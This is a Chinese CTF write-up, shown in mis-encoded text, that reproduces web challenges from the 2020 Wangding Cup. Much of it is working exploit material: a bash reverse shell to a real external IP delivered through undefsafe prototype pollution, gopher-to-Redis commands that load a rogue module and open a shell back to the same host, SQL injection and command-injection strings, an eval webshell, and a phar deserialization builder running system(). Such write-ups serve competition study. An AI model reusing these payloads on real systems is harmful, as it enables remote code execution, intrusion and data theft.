# 2020ÁΩëÈºé-Â§çÁé∞

# ÂàùËµõ
## ÈùíÈæôÁªÑ
### notes
#node-ÂéüÂûãÈìæÊ±°Êüì-undefsafe
```JS
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))

```
undefsafe<2.03ÂéüÂûãÈìæÊ±°ÊüìÊºèÊ¥û
![](attachments/Pasted%20image%2020240331210434.png)

![](attachments/Pasted%20image%2020240331210548.png)
edit_note ‰º†ÂÖ•`id=__proto__`,author‰∏∫Ê±°ÊüìÁöÑÂÜÖÂÆπ
Áî±‰∫é commands Âíå note_list ÈÉΩÁªßÊâøËá™Âêå‰∏Ä‰∏™ÂéüÂûãÔºåÈÇ£‰πàÂú®ÈÅçÂéÜ commands Êó∂‰æø‰ºöÂèñÂà∞Êàë‰ª¨Ê±°ÊüìËøõÂéªÁöÑÊÅ∂ÊÑèÂëΩ‰ª§Âπ∂ÊâßË°å„ÄÇ
payload
`id=__proto__&author=bash -i >& /dev/tcp/49.232.206.37/23456 0>&1&raw=wum0nster`
ÂèÇÊï∞Áõ¥Êé•‰º†‰ºöÊúâ‰∏Ä‰∫õÈóÆÈ¢òÁî®postmanËé∑Âèñpython
```PYTHON
import requests

url = "http://faccdaea-1505-4426-8438-9d245cbe7cab.node5.buuoj.cn:81/edit_note"

data= {
	"id": "__proto__",
	"author": "bash -i >& /dev/tcp/49.232.206.37/23456 0>&1",
	"raw": "wum0nster"
}

res = requests.post(url,data=data)
```

ËÆøÈóÆ/statusÂèçÂºπshell
![](attachments/Pasted%20image%2020240331212832.png)

## ÁéÑÊ≠¶ÁªÑ
### SSRFMe
```PHP
<?php  
function¬†check_inner_ip($url)  
{¬†¬†¬†¬†$match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);  
¬†¬†¬†¬†if¬†(!$match_result)  
¬†¬†¬†¬†{  
¬†¬†¬†¬†¬†¬†¬†¬†die('url¬†fomat¬†error');  
¬†¬†¬†¬†}  
¬†¬†¬†¬†try  
¬†¬†¬†¬†{¬†¬†¬†¬†¬†¬†¬†¬†$url_parse=parse_url($url);  
¬†¬†¬†¬†}  
¬†¬†¬†¬†catch(Exception¬†$e)  
¬†¬†¬†¬†{  
¬†¬†¬†¬†¬†¬†¬†¬†die('url¬†fomat¬†error');  
¬†¬†¬†¬†¬†¬†¬†¬†return¬†false;  
¬†¬†¬†¬†}¬†¬†¬†¬†$hostname=$url_parse['host'];¬†¬†¬†¬†$ip=gethostbyname($hostname);¬†¬†¬†¬†$int_ip=ip2long($ip);  
¬†¬†¬†¬†return¬†ip2long('127.0.0.0')>>24¬†==¬†$int_ip>>24¬†||¬†ip2long('10.0.0.0')>>24¬†==¬†$int_ip>>24¬†||¬†ip2long('172.16.0.0')>>20¬†==¬†$int_ip>>20¬†||¬†ip2long('192.168.0.0')>>16¬†==¬†$int_ip>>16;  
}  
  
function¬†safe_request_url($url)  
{  
  
¬†¬†¬†¬†if¬†(check_inner_ip($url))  
¬†¬†¬†¬†{  
¬†¬†¬†¬†¬†¬†¬†¬†echo¬†$url.'¬†is¬†inner¬†ip';  
¬†¬†¬†¬†}  
¬†¬†¬†¬†else  
¬†¬†¬†¬†{¬†¬†¬†¬†¬†¬†¬†¬†$ch¬†=¬†curl_init();¬†¬†¬†¬†¬†¬†¬†¬†curl_setopt($ch,¬†CURLOPT_URL,¬†$url);¬†¬†¬†¬†¬†¬†¬†¬†curl_setopt($ch,¬†CURLOPT_RETURNTRANSFER,¬†1);¬†¬†¬†¬†¬†¬†¬†¬†curl_setopt($ch,¬†CURLOPT_HEADER,¬†0);¬†¬†¬†¬†¬†¬†¬†¬†$output¬†=¬†curl_exec($ch);¬†¬†¬†¬†¬†¬†¬†¬†$result_info¬†=¬†curl_getinfo($ch);  
¬†¬†¬†¬†¬†¬†¬†¬†if¬†($result_info['redirect_url'])  
¬†¬†¬†¬†¬†¬†¬†¬†{¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†safe_request_url($result_info['redirect_url']);  
¬†¬†¬†¬†¬†¬†¬†¬†}¬†¬†¬†¬†¬†¬†¬†¬†curl_close($ch);¬†¬†¬†¬†¬†¬†¬†¬†var_dump($output);  
¬†¬†¬†¬†}  
  
}  
if(isset($_GET['url'])){¬†¬†¬†¬†$url¬†=¬†$_GET['url'];  
¬†¬†¬†¬†if(!empty($url)){¬†¬†¬†¬†¬†¬†¬†¬†safe_request_url($url);  
¬†¬†¬†¬†}  
}  
else{¬†¬†¬†¬†highlight_file(__FILE__);  
}  
//¬†Please¬†visit¬†hint.php¬†locally.  
?>
```


hint.php
```php
<?php   
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){¬†¬†
	highlight_file(__FILE__);   
}   
if(isset($_POST['file'])){¬†¬†
	file_put_contents($_POST['file'],"<?php¬†echo¬†'redispass¬†is¬†root';exit();".$_POST['file']);   
} 
```


```sh
gopher://0.0.0.0:6379/_auth root
config set dir /tmp/
quit
//ËÆæÁΩÆÂ§á‰ªΩÊñá‰ª∂Ë∑ØÂæÑ‰∏∫/tmp/ È°∫‰æøËØ¥‰∏Ä‰∏ãÁúãÂà∞ÂΩìÊó∂Â§ß‰Ω¨ÁöÑÂçöÂÆ¢ËØ¥ËØï‰∫ÜÂæàÂ§öÁõÆÂΩïÔºåÊúÄÂêéÂèëÁé∞Âè™Êúâ/tmpÊúâÊùÉÈôê ÔºåÂè™ÈúÄË¶ÅÊúâËØªÊùÉÈôêÂç≥ÂèØÔºåÊâÄ‰ª•ËØ¥Âπ≥Êó∂ÂÅöÊ∏óÈÄèÊàñËÄÖÂÅöÈ¢òÂ•ΩÂ§öËØïËØïÂïä

gopher://0.0.0.0:6379/_auth root
config set dbfilename exp.so
slaveof 49.232.206.37 21000
quit
//ËÆæÁΩÆÂ§á‰ªΩÊñá‰ª∂Âêç‰∏∫Ôºöexp.soÔºåËÆæÁΩÆ‰∏ªredisÂú∞ÂùÄ‰∏∫49.232.206.37ÔºåÁ´ØÂè£‰∏∫21000 Âú∞ÂùÄ‰∏∫Ëá™Â∑±ÁöÑVPS
gopher://0.0.0.0:6379/_auth root
module load /tmp/exp.so
system.rev 49.232.206.37 23456
quit
//ÂØºÂÖ• exp.so ÔºåÂèçÂºπshellÂà∞49.232.206.37:23456

```
## Êú±ÈõÄÁªÑ

### Think Java

È¢òÁõÆÊèê‰æõÈÉ®ÂàÜÊ∫êÁ†ÅÔºåSqlDict.classÊúâÊòéÊòæÁöÑsqlÊ≥®ÂÖ•ÊºèÊ¥û
üí° jdbcÁ±ª‰ººURLËß£Êûê

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package cn.abc.core.sqldict;

import java.sql.Connection;
import java.sql.DatabaseMetaData;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class SqlDict {
    public SqlDict() {
    }

    public static Connection getConnection(String dbName, String user, String pass) {
        Connection conn = null;

        try {
            Class.forName("com.mysql.jdbc.Driver");
            if (dbName != null && !dbName.equals("")) {
                dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
            } else {
                dbName = "jdbc:mysql://mysqldbserver:3306/myapp";
            }

            if (user == null || dbName.equals("")) {
                user = "root";
            }

            if (pass == null || dbName.equals("")) {
                pass = "abc@12345";
            }

            conn = DriverManager.getConnection(dbName, user, pass);
        } catch (ClassNotFoundException var5) {
            var5.printStackTrace();
        } catch (SQLException var6) {
            var6.printStackTrace();
        }

        return conn;
    }

    public static List<Table> getTableData(String dbName, String user, String pass) {
        List<Table> Tables = new ArrayList();
        Connection conn = getConnection(dbName, user, pass);
        String TableName = "";

        try {
            Statement stmt = conn.createStatement();
            DatabaseMetaData metaData = conn.getMetaData();
            ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]{"TABLE"});

            while(tableNames.next()) {
                TableName = tableNames.getString(3);
                Table table = new Table();
                String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
                ResultSet rs = stmt.executeQuery(sql);

                while(rs.next()) {
                    table.setTableDescribe(rs.getString("TABLE_COMMENT"));
                }

                table.setTableName(TableName);
                ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, "");
                ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName);

                String PK;
                for(PK = ""; rs2.next(); PK = rs2.getString(4)) {
                }

                while(data.next()) {
                    Row row = new Row(data.getString("COLUMN_NAME"), data.getString("TYPE_NAME"), data.getString("COLUMN_DEF"), data.getString("NULLABLE").equals("1") ? "YES" : "NO", data.getString("IS_AUTOINCREMENT"), data.getString("REMARKS"), data.getString("COLUMN_NAME").equals(PK) ? "true" : null, data.getString("COLUMN_SIZE"));
                    table.list.add(row);
                }

                Tables.add(table);
            }
        } catch (SQLException var16) {
            var16.printStackTrace();
        }

        return Tables;
    }
}
```


ÂèëÁé∞‰ª£Á†Å‰∏≠Â≠òÂú®swagger api `import io.swagger.annotations.ApiOperation;`

ËÆøÈóÆswagger-ui.html Â≠òÂú®

![](attachments/Pasted%20image%2020240830103152.png)


sqlÊ≥®ÂÖ•‰ΩçÁΩÆÂú®Êé•Âè£Â§Ñ`myapp#' union select pwd from user#`

![](attachments/Pasted%20image%2020240830104556.png)

admin@Rrrr_ctf_asde

![](attachments/Pasted%20image%2020240830104824.png)

```json
{ "data": "Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu", "msg": "ÁôªÂΩïÊàêÂäü", "status": 2, "timestamps": 1724986090643 }
```

ÂØπjavaÂ∫èÂàóÂåñÊï∞ÊçÆËøõË°åËß£Êûê

```
java -jar .\SerializationDumper.jar aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c000269647400104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 24 - 0x00 18
        Value - cn.abc.core.model.UserVo - 0x636e2e6162632e636f72652e6d6f64656c2e55736572566f
      serialVersionUID - 0x76 46 43 31 7b 04 f4 3a
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 2 - 0x00 02
            Value - id - 0x6964
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 16 - 0x00 10
              Value - Ljava/lang/Long; - 0x4c6a6176612f6c616e672f4c6f6e673b
        1:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 02
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 03
    classdata
      cn.abc.core.model.UserVo
        values
          id
            (object)
              TC_OBJECT - 0x73
                TC_CLASSDESC - 0x72
                  className
                    Length - 14 - 0x00 0e
                    Value - java.lang.Long - 0x6a6176612e6c616e672e4c6f6e67
                  serialVersionUID - 0x3b 8b e4 90 cc 8f 23 df
                  newHandle 0x00 7e 00 04
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 1 - 0x00 01
                  Fields
                    0:
                      Long - L - 0x4a
                      fieldName
                        Length - 5 - 0x00 05
                        Value - value - 0x76616c7565
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_CLASSDESC - 0x72
                      className
                        Length - 16 - 0x00 10
                        Value - java.lang.Number - 0x6a6176612e6c616e672e4e756d626572
                      serialVersionUID - 0x86 ac 95 1d 0b 94 e0 8b
                      newHandle 0x00 7e 00 05
                      classDescFlags - 0x02 - SC_SERIALIZABLE
                      fieldCount - 0 - 0x00 00
                      classAnnotations
                        TC_ENDBLOCKDATA - 0x78
                      superClassDesc
                        TC_NULL - 0x70
                newHandle 0x00 7e 00 06
                classdata
                  java.lang.Number
                    values
                  java.lang.Long
                    values
                      value
                        (long)1 - 0x00 00 00 00 00 00 00 01
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 07
                Length - 5 - 0x00 05
                Value - admin - 0x61646d696e
```

![](attachments/Pasted%20image%2020240830105908.png)

Ë∫´‰ªΩËÆ§ËØÅÂ§Ñ‰º†ÂÖ•ÊãøÂà∞ÁöÑÊï∞ÊçÆÂêéÂÆåÊàê‰∫ÜË∫´‰ªΩËÆ§ËØÅÔºåÁåúÊµãÂ≠òÂú®ÂèçÂ∫èÂàóÂåñÊºèÊ¥û

![](attachments/Pasted%20image%2020240830111459.png)

Â≠òÂú®romeÈìæ



## ÁôΩËôéÁªÑ
### PicDown
Áõ¥Êé•Êñá‰ª∂ËØªÂèñ

```
page?url=../../../../flag
```
# ÂçäÂÜ≥Ëµõ
## AliceWebsite

Êé®Êµã‰∏∫Êñá‰ª∂ÂåÖÂê´

```php
<?php  
$action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');  
if (file_exists($action)) {  
    include $action;  
} else {  
    echo "File not found!";  
}  
?>
```

![](attachments/Pasted%20image%2020240329191705.png)



![](attachments/Pasted%20image%2020240329191735.png)


## faka

sqlÊñá‰ª∂‰∏≠Áªô‰∫ÜÂØÜÁ†ÅÁöÑmd5ÂÄº

![](attachments/Pasted%20image%2020240402090037.png)

adminÁôªÂΩïÁöÑÊ†°È™åÈÄªËæë

![](attachments/Pasted%20image%2020240402085951.png)


![](attachments/Pasted%20image%2020240402090631.png)


`admincccbbb123`


‰ª£Á†ÅÂÆ°ËÆ°ÂêéÔºåÂ≠òÂú®Êñá‰ª∂‰∏ãËΩΩÔºå‰ΩÜÊòØflag‰∏çÂú®/flag‰∏≠

![](attachments/Pasted%20image%2020240402091444.png)

ÊúâÊñá‰ª∂‰∏ä‰º†

![](attachments/Pasted%20image%2020240402092120.png)

ÂâçÈù¢ÈôêÂà∂‰∫Ü‰∏ä‰º†ÁöÑÊñá‰ª∂ÂêéÁºÄÔºå‰ΩÜÊòØÂà∞Êñá‰ª∂‰∏ä‰º†Â§ÑÁêÜÁöÑ‰ΩçÁΩÆmoveÂáΩÊï∞

```PHP
public function move($path, $savename = true, $replace = true)  
{  
    // Êñá‰ª∂‰∏ä‰º†Â§±Ë¥•ÔºåÊçïËé∑ÈîôËØØ‰ª£Á†Å  
    if (!empty($this->info['error'])) {  
        $this->error($this->info['error']);  
        return false;  
    }  
  
    // Ê£ÄÊµãÂêàÊ≥ïÊÄß  
    if (!$this->isValid()) {  
        $this->error = 'upload illegal files';  
        return false;  
    }  
  
    // È™åËØÅ‰∏ä‰º†  
    if (!$this->check()) {  
        return false;  
    }  
  
    $path = rtrim($path, DS) . DS;  
    // Êñá‰ª∂‰øùÂ≠òÂëΩÂêçËßÑÂàô  
    $saveName = $this->buildSaveName($savename);  
    $filename = $path . $saveName;  
  
    // Ê£ÄÊµãÁõÆÂΩï  
    if (false === $this->checkPath(dirname($filename))) {  
        return false;  
    }  
  
    // ‰∏çË¶ÜÁõñÂêåÂêçÊñá‰ª∂  
    if (!$replace && is_file($filename)) {  
        $this->error = ['has the same filename: {:filename}', ['filename' => $filename]];  
        return false;  
    }  
  
    /* ÁßªÂä®Êñá‰ª∂ */    if ($this->isTest) {  
        rename($this->filename, $filename);  
    } elseif (!move_uploaded_file($this->filename, $filename)) {  
        $this->error = 'upload write error';  
        return false;  
    }  
  
    // ËøîÂõû File ÂØπË±°ÂÆû‰æã  
    $file = new self($filename);  
    $file->setSaveName($saveName)->setUploadInfo($this->info);  
  
    return $file;  
}
```

`$md5[1]`ÁöÑÂÄº‰∏∫ÊúÄÂêéÁöÑÊñá‰ª∂ÂêçÔºåËÄåÂØπmd5ÁöÑ‰º†ÂèÇÊòØÊ≤°ÊúâÊ£ÄÊü•ÂæóÂà∞

checkÂáΩÊï∞Ê£ÄÊü•‰∫ÜÊñá‰ª∂Â§¥ÔºåÂä†‰∏äÂõæÁâáÂ§¥ÁªïËøá

```PHP
public function check($rule = [])  
{  
    $rule = $rule ?: $this->validate;  
  
    /* Ê£ÄÊü•Êñá‰ª∂Â§ßÂ∞è */    if (isset($rule['size']) && !$this->checkSize($rule['size'])) {  
        $this->error = 'filesize not match';  
        return false;  
    }  
  
    /* Ê£ÄÊü•Êñá‰ª∂ Mime Á±ªÂûã */    if (isset($rule['type']) && !$this->checkMime($rule['type'])) {  
        $this->error = 'mimetype to upload is not allowed';  
        return false;  
    }  
  
    /* Ê£ÄÊü•Êñá‰ª∂ÂêéÁºÄ */    if (isset($rule['ext']) && !$this->checkExt($rule['ext'])) {  
        $this->error = 'extensions to upload is not allowed';  
        return false;  
    }  
  
    /* Ê£ÄÊü•ÂõæÂÉèÊñá‰ª∂ */    if (!$this->checkImg()) {  
        $this->error = 'illegal image files';  
        return false;  
    }  
  
    return true;  
}
```


Âú®‰º†ÂèÇËøáÁ®ã‰∏≠‰ºöËá™Âä®ÁîüÊàêÂØπÂ∫îÁöÑtokenÂíåkeyÂÄºÁ≤òË¥¥Âç≥ÂèØ

![](attachments/Pasted%20image%2020240402103221.png)

![](attachments/Pasted%20image%2020240402103233.png)

![](attachments/Pasted%20image%2020240402103246.png)


## BabyJS

![](attachments/Pasted%20image%2020240403082936.png)

ÂèØ‰ª•ÂÆåÊàêÂØπ`/tmp/log`ÁöÑËØªÂíåÂÜôÔºåËÄÉËôëÂëΩ‰ª§Ê≥®ÂÖ•Â∞ÜflagÊ≥®ÂÖ•Âà∞logÊñá‰ª∂‰∏≠ÂÜçËØªÂèñ
![](attachments/Pasted%20image%2020240403083740.png)


`echo 'cmd' >> /tmp/log`  Âú®cmdÂ§ÑÊèíÂÖ•`';cp /flag /tmp/log;%00`


`@`ÂâçÁöÑÁî®Êà∑ÂêçÈÉ®ÂàÜ‰ºö‰∫åÊ¨°Ëß£Á†Å

![](attachments/Pasted%20image%2020240403085255.png)

ÂÖ´ËøõÂà∂ÁªïËøáÊú¨Âú∞ip

payload
`http://0177.0.0.1:3000/debug?url=http://%2527@wum0nster;cp$IFS/flag$IFS/tmp/log;%00`

# ÊÄªÂÜ≥Ëµõ
## Novel

Âú®back.class.php Â∞ÜÂÜÖÂÆπÂ≠òÂÇ®‰∏∫‰∫Üphp

```PHP
public function backup($filename, $dest){  
    $filename='profile/'.$filename;  
    if(file_exists($filename)){  
       $content=htmlspecialchars(file_get_contents($filename),ENT_QUOTES);  
       $password=$this->random_code();  
       $r['path']=$this->_write($dest, $this->_create($password, $content));  
       $r['password']=$password;  
       echo json_encode($r);  
    }  
}  
  
/* ÂÖàÈ™åËØÅ‰øùËØÅ‰∏∫Â§á‰ªΩÊñá‰ª∂Âêé,ÂÜç‰øùÂ≠ò‰∏∫ÁßÅËóèÊñá‰ª∂ */
private function _write($dest, $content){  
    $f1=$dest;  
    $f2='private/'.$this->random_code(10).".php";  
  
    $stream_f1 = fopen($f1, 'w+');  
  
    fwrite($stream_f1, $content);  
    rewind($stream_f1);  
    $f1_read=fread($stream_f1, 3000);  
      
    preg_match('/^<\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]{8}\"\?print\(\".*\"\):exit\(\); $/s', $f1_read, $matches);  
      
    if(!empty($matches[0])){  
       copy($f1,$f2);  
       fclose($stream_f1);     
       return $f2;       
    }else{  
       fwrite($stream_f1, '<?php exit(); ?>');  
       fclose($stream_f1);  
       return false;  
    }  
  
}  
  
private function _create($password, $content){  
    $_content='<?php $_GET["password"]==="'.$password.'"?print("'.$content.'"):exit(); ';  
    return $_content;  
}
```

Áî®phpÁöÑÂ§çÊùÇËØ≠Ê≥ïbypass exitÂÆåÊàêÂëΩ‰ª§ÊâßË°å

```
${eval($_POST[1])}
```

‰∏ä‰º†txtÁßÅËóè

![](attachments/Pasted%20image%2020240403160300.png)


![](attachments/Pasted%20image%2020240403160702.png)

![](attachments/Pasted%20image%2020240403160737.png)

## Game Exp
ÁåúÊµã‰∏∫ÂèçÂ∫èÂàóÂåñ

![](attachments/Pasted%20image%2020240403175308.png)

file_exists ÂèØ‰ª•Ëß¶ÂèëpharÔºåusernameÂèØÊéß
![](attachments/Pasted%20image%2020240403180935.png)

![](attachments/Pasted%20image%2020240403181815.png)

```PHP
<?php  
class AnyClass{  
    var $output = 'echo "ok";';  
}  
  
$o = new AnyClass();  
$o->output = 'system($_GET[0]);';  
  
$phar = new Phar("phar.jpg");  
$phar->startBuffering();  
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //ËÆæÁΩÆstubÔºåÂ¢ûÂä†gifÊñá‰ª∂Â§¥  
$phar->setMetadata($o); //Â∞ÜËá™ÂÆö‰πâmeta-dataÂ≠òÂÖ•manifest  
$phar->addFromString("test.txt", "test"); //Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂  
$phar->stopBuffering();
```
ÊûÑÈÄ†usernameÂç≥ÂèØËß¶Âèë

![](attachments/Pasted%20image%2020240403182442.png)
